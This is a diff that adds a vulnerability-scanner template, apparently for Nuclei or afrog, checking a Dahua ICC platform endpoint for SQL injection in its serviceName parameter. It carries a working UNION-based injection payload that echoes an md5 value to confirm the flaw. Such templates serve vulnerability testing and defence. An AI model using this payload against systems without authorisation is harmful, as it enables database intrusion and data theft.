@@ -1,0 +1,30 @@
+id: dahua-icc-servicename-sql-inject
+
+info:
+  name: 大华 ICC 智能物联综合管理平台 ars/list SQL 注入
+  author: k5rC85Lma
+  severity: high
+  description: |
+    大华 ICC /evo-apigw/evo-arsm/1.0.0/ars/list 的 serviceName 参数存在 SQL 注入，可用 UNION+md5 本地验证。
+    与 DSS、智慧园区、NVR 不是同一 SKU。
+  reference:
+    - https://github.com/zan8in/afrog
+  tags: dahua,icc,sqli
+
+variables:
+  randnum: "{{rand_int(1000,9999)}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/evo-apigw/evo-arsm/1.0.0/ars/list?serviceName=%27+UNION+ALL+SELECT+NULL,NULL,NULL,CONCAT(0x7e,md5({{randnum}}),0x7e),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{md5(randnum)}}"
